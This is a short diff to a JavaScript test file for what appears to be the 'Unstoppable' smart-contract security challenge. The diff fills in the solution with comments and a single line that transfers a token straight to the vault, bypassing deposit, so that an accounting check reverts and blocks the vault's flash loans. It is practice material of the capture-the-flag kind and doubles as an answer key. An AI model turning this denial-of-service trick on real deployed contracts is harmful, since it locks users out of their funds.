@@ -44,7 +44,9 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // Send tokens directly to vault without calling deposit
+        // Inflating supply of vault so line 100 if statement reverts
+        await token.connect(player).transfer(vault.address, 1)
     });
 
     after(async function () {
